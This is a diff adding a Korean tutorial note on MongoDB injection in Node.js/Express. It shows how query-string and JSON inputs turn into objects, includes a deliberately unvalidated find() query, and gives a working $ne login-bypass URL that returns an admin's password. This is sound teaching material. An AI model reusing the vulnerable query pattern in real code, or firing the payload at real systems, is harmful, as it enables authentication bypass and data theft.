@@ -1,0 +1,166 @@
+MongoDB - Bug Case :
+    MongoDB에서 주로 발생하는 취약점으로 MongoDB Injection이 있습니다.
+    MongoDB Injection 취약점은 주로 사용자 입력 데이터에 대한 타입 검증이 충분하지 않아 발생합니다.
+
+    밑의 GET 방식과 POST 방식처럼 입력 시 서버에서는 사용자의 입력 데이터를 다른 데이터 타입으로 처리할 수도 있습니다.
+    MongoDB에서는 오브젝트 타입의 입력 데이터로 처리 시 쿼리 연산자등을 사용할 수 있으며, 이를 통해 의도하지 않은 행위를 수행할 수 있습니다.
+
+    또한 밑의 Sample Code와 같은 상황에서 사용자가 입력하는 uid와 upw를 오브젝트 타입의 입력 데이터로 조회하여 원하는 데이터를 조회할 수 있습니다.
+
+GET :
+    아래의 코드는 NodeJS의 Express 프레임워크로 만들어진 웹서버입니다.
+    사용자의 입력 데이터를 받아 해당 데이터의 값과 타입을 확인하는 코드입니다.
+    ex)
+        const express = require('express');
+        const app = express();
+        
+        app.get('/', function(req,res) {
+            console.log('data:', req.query.data);
+            console.log('type:', typeof req.query.data);
+            res.send('hello world');
+        });
+        
+        const server = app.listen(3000, function(){
+            console.log('app.listen');
+        });
+
+    입력을 다음과 같이 처리합니다.
+    ex)
+        http://localhost:3000/?data=1234
+        data: 1234
+        type: string
+        
+        http://localhost:3000/?data[]=1234
+        data: [ '1234' ]
+        type: object
+        
+        http://localhost:3000/?data[]=1234&data[]=5678
+        data: [ '1234', '5678' ] 
+        type: object
+        
+        http://localhost:3000/?data[5678]=1234
+        data: { '5678': '1234' } 
+        type: object
+        
+        http://localhost:3000/?data[5678]=1234&data=0000
+        data: { '5678': '1234', '0000': true } 
+        type: object
+        
+        http://localhost:3000/?data[5678]=1234&data[]=0000
+        data: { '0': '0000', '5678': '1234' } 
+        type: object
+        
+        http://localhost:3000/?data[5678]=1234&data[1111]=0000
+        data: { '1111': '0000', '5678': '1234' } 
+        type: object
+
+    req.query의 타입이 문자열로 고정되어있지 않기 때문에 문자열 타입외의 데이터 타입이 입력될 수 있습니다.
+
+POST :
+    단순히 /post 페이지에서 입력받은 data 값을 출력하는 코드입니다.
+    ex)
+        const express = require('express');
+        const app = express();
+        
+        app.use(express.json());
+        app.use(express.urlencoded( {extended : false } ));
+        
+        app.get('/', function(req,res) {
+            res.send('hello world');
+        });
+        
+        app.post('/post', function(req,res) {
+            console.log('data:', req.body.data);
+            console.log('type:', typeof req.body.data);
+            res.send({"status":"ok"});
+        });
+        
+        const server = app.listen(3000, function(){
+            console.log('app.listen');
+        });
+
+    입력을 다음과 같이 처리합니다.
+    ex)
+        function post(data){
+        var url = '/post';
+        fetch(url, {
+            method: 'POST',
+            body: JSON.stringify(data),
+            headers:{
+            'Content-Type': 'application/json'
+            }
+        }).then(res => res.json())
+        .then(response => console.log('Success:', JSON.stringify(response)))
+        }
+        
+        post({"data": 1234});
+        // data: 1234
+        // type: number
+        
+        post({"data": [1, 2, 3]});
+        // data: [ 1, 2, 3 ]
+        // type: object
+        
+        post({"data":{ test: 1 }});
+        // data: { test: 1 }
+        // type: object
+
+    req.body에 들어가는 값이 json 형식이기 때문에 타입이 문자열로 고정되어있지 않고 문자열 타입외의 데이터 타입이 입력될 수 있습니다.
+
+Sample Code :
+    아래의 NodeJS 코드는 user 콜렉션에서 사용자가 입력한 uid와 upw에 해당하는 데이터를 찾아 출력합니다.
+    ex)
+        const express = require('express');
+        const app = express();
+        
+        const mongoose = require('mongoose');
+        const db = mongoose.connection;
+        mongoose.connect('mongodb://localhost:27017/', { useNewUrlParser: true, useUnifiedTopology: true });
+        
+        app.get('/query', function(req,res) {
+            db.collection('user').find({
+                'uid': req.query.uid,
+                'upw': req.query.upw
+            }).toArray(function(err, result) {
+                if (err) throw err;
+                res.send(result);
+            });
+        });
+        
+        const server = app.listen(3000, function(){
+            console.log('app.listen');
+        });
+
+    find 부분에서 req.query.uid,req.query.upw의 데이터로 조회를 수행합니다.
+
+    사용자는 오브젝트 타입의 입력 데이터를 입력하여, uid 또는 upw를 모르는 상황에서도 해당 콜렉션의 데이터를 조회할 수 있습니다.
+    ex)
+        http://localhost:3000/query?uid[$ne]=a&upw[$ne]=a
+        => [{"_id":"5ebb81732b75911dbcad8a19","uid":"admin","upw":"secretpassword"}]
+
+    쿼리 연산자 중 $ne를 사용하여 해당 데이터와 일치하지 않는 값들을 조회할 수 있습니다.
+
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
